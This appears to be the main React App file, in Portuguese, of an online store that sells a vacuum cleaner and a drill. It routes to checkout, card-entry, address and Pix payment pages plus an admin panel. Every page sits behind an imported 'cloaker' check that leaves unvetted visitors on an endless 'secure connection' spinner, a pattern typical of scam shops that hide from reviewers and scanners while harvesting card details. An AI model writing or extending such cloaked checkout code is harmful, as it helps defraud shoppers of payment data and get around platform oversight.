import React, { useState, useEffect } from "react";
import { BrowserRouter as Router, Routes, Route, Navigate } from "react-router-dom";
import { Toaster } from "sonner";

// Páginas e Componentes
import Index from "./pages/Index";
import AspiradorProductPage from "./products/aspirador-de-po/ProductPage";
import FuradeiraProductPage from "./products/furadeira/ProductPage";
import Checkout from "./pages/Checkout";
import AddCard from "./pages/AddCard";
import AddAddress from "./pages/AddAddress";
import PixPayment from "./pages/PixPayment";
import Admin from "./pages/Admin";
import NotFound from "./pages/NotFound";

// Utilitários de Proteção Ultra 2026
import { initCloaker } from "./utils/cloaker";

const App = () => {
  const [isSafe, setIsSafe] = useState<boolean | null>(null);

  useEffect(() => {
    const runUltraGuard = async () => {
      const result = await initCloaker({ silent: true });
      if (result) {
        setIsSafe(true);
      }
    };

    runUltraGuard();
  }, []);

  if (isSafe === null) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6">
        <div className="w-10 h-10 border-4 border-gray-100 border-t-[#FF2C55] rounded-full animate-spin mb-4"></div>
        <p className="text-[14px] text-gray-400 font-medium">Verificando conexão segura...</p>
      </div>
    );
  }

  return (
    <Router>
      <Toaster position="top-center" richColors />
      <Routes>
        <Route path="/" element={<Index />} />
        <Route path="/aspirador-de-po" element={<AspiradorProductPage />} />
        <Route path="/furadeira" element={<FuradeiraProductPage />} />
        
        <Route path="/aspirador-de-po/checkout" element={<Checkout />} />
        <Route path="/aspirador-de-po/cartao" element={<AddCard />} />
        <Route path="/aspirador-de-po/endereco" element={<AddAddress />} />
        <Route path="/aspirador-de-po/pix" element={<PixPayment />} />

        <Route path="/furadeira/checkout" element={<Checkout />} />
        <Route path="/furadeira/cartao" element={<AddCard />} />
        <Route path="/furadeira/endereco" element={<AddAddress />} />
        <Route path="/furadeira/pix" element={<PixPayment />} />

        <Route path="/admin" element={<Admin />} />
        <Route path="/404" element={<NotFound />} />
        <Route path="*" element={<Navigate to="/404" replace />} />
      </Routes>
    </Router>
  );
};

export default App;